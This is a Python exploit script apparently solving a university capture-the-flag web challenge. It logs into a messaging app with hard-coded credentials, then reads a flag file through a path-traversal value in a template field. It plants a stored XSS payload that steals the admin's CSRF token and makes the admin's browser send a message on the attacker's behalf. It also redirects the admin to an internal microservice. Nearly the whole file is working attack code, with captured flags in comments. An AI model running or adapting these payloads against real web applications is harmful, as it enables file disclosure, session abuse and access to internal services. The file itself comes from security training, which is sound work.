import requests
from bs4 import BeautifulSoup

LOGIN = 'f982facnfq9nr231j'
PASSWORD = '0qf290ADn09nqnodind'
URL = 'https://web.kazet.cc:42448'

def get_csrf_token(session):
    url = f'{URL}'
    r = session.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'}).get('value')
    return csrf_token

def login():
    url = f'{URL}/accounts/login/'
    session = requests.session()
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Connection': 'keep-alive',
    }
    data = {
        'csrfmiddlewaretoken': get_csrf_token(session),
        'username': LOGIN,
        'password': PASSWORD,
        'submit': 'Zaloguj',
    }
    session.post(url, headers=headers, data=data)
    return session

def get_flag_in_file(session):
    url = f'{URL}/create'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    }
    content = '''xd'''
    data = {
        'csrfmiddlewaretoken': session.cookies.get('csrftoken'),
        'recipient': 'admin',
        'content': content,
        'template': '../../../../../../../../../../flag.txt',
    }
    r = session.post(url, headers=headers, data=data)
    # otrzymujemy flagę w wiadomości
    soup = BeautifulSoup(r.text, 'html.parser')
    flag = soup.find('div', {'class': 'content'}).text
    print(flag)

def get_flag_in_footer(session):
    url = f'{URL}/create'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    }
    content = f'''
    <script>
      fetch('https://web.kazet.cc:42448/create').then(function (response) {{
        return response.text();
      }}).then(function (html) {{
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        return doc.querySelector('input[name=csrfmiddlewaretoken]').value;
      }}).then(function (csrfToken) {{
        const url = 'https://web.kazet.cc:42448/create';
        const headers = {{
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        }};
        const data = new URLSearchParams();
        data.append('csrfmiddlewaretoken', csrfToken);
        data.append('recipient', '{LOGIN}');
        data.append('content', 'xd');
        data.append('template', 'normal');
        return fetch(url, {{
          method: 'POST',
          headers: headers,
          body: data,
          credentials: 'include',
        }});
      }});
    </script>
    '''
    data = {
        'csrfmiddlewaretoken': session.cookies.get('csrftoken'),
        'recipient': 'admin',
        'content': content,
        'template': 'normal',
    }
    session.post(url, headers=headers, data=data)
    # admin wysyła do nas wiadomość z flagą w stopce

def get_flag_in_microservice(session):
    url = f'{URL}/create'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    }
    content = f'''
    <script>
    window.location = "http://zad41-mimuw-finals-2023-super-secret-microservice:80"
    </script>
    '''
    data = {
        'csrfmiddlewaretoken': session.cookies.get('csrftoken'),
        'recipient': LOGIN,
        'content': content,
        'template': 'normal',
    }
    r = session.post(url, headers=headers, data=data)
    soup = BeautifulSoup(r.text, 'html.parser')
    link = soup.find_all('a')[0]
    url = f'{URL}{link.get("href")}'
    r = session.get(url)
    with open('flag.png', 'wb') as f:
        f.write(r.content)
    # w pliku flag.png jest flaga

session = login()
get_flag_in_file(session)         # FLAG{JeszczeJednaFlagaZaPunkty}
get_flag_in_footer(session)       # FLAG{ToJestFlagaZeStopki}
get_flag_in_microservice(session) # FLAG{71a4b4fd2214b808e4942dfb06c717878399a04c}
